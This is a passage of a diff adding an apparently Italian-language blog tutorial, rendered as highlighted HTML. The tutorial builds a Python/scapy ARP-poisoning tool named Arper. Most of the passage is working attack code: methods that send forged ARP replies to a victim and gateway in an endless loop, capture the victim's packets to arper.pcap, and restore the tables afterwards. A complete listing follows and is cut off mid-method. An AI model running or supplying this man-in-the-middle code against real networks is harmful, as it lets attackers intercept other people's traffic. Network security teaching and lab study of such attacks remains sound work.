+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
+        poison_gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac
+        
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Beginning the ARP poison. [CTRL-C to stop]&amp;#39;&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
+            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+                send(poison_victim)
+                send(poison_gateway)
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
+                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restore()
+                sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+                time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;poison&lt;/strong&gt; imposta i dati che useremo per “avvelenare” la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP &lt;em&gt;poisoned&lt;/em&gt; per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l’indirizzo IP della vittima ma con il MAC dell’aggressore. Facciamo poi lo stesso inviando alla vittima l’indirizzo IP del gateway ma con il MAC address dell’aggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.&lt;/p&gt;
+&lt;p&gt;Poi iniziamo a spedire i pacchetti “avvelenati” alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell’attacco.&lt;/p&gt;
+&lt;p&gt;Porremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da lì ripristineremo la situazione riportandola alla normalità, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.&lt;/p&gt;
+&lt;p&gt;Per vedere e registrare cosa succede durante le nostre operazioni di &lt;em&gt;poisoning&lt;/em&gt;, intercettiamo il traffico di rete con il metodo &lt;strong&gt;sniff&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
+        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sniffing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; packets&amp;#39;&lt;/span&gt;)
+        bpf_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip host &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; victim
+        packets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sniff(count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;count, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bpf_filter, iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface)
+        wrpcap(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arper.pcap&amp;#39;&lt;/span&gt;, packets)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Got the packets&amp;#39;&lt;/span&gt;)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restrore()
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminate()
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Finished.&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;sniff&lt;/strong&gt; resta in pausa per cinque secondi prima di iniziare lo &lt;em&gt;sniffing&lt;/em&gt; per dare tempo al thread che esegue il vero e proprio &lt;em&gt;poisoning&lt;/em&gt; di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l’indirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo &lt;em&gt;arper.pcap&lt;/em&gt;, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l’attacco.&lt;/p&gt;
+&lt;p&gt;Da ultimo, il metodo &lt;strong&gt;restore&lt;/strong&gt; riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restrore&lt;/span&gt;(self):
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Restoring ARP Tables...&amp;#39;&lt;/span&gt;)
+        send(ARP(
+            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
+            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
+            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac, 
+            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
+            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
+            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+        send(ARP(
+            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
+            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
+            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac, 
+            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
+            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
+            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;restore&lt;/strong&gt; potrebbe essere chiamato sia da &lt;strong&gt;poison&lt;/strong&gt; (dopo un CTRL-C), sia da &lt;strong&gt;sniff&lt;/strong&gt; (quando il numero di pacchetti richiesti è stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.&lt;/p&gt;
+&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; multiprocessing &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Process
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
+    packet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ether(dst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ARP(op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;who-has&amp;#34;&lt;/span&gt;, pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;targetip)
+    resp, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; srp(packet, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, retry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, verbose&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _, r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r[Ether]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;src
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(victim)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gateway
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(gateway)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
+        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
+        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;verb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Initialized &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gateway (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;gateway&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Victim (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;victim&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
+        
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
+
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
+        poison_victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
+        poison_gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
+        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac
+
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        print(poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
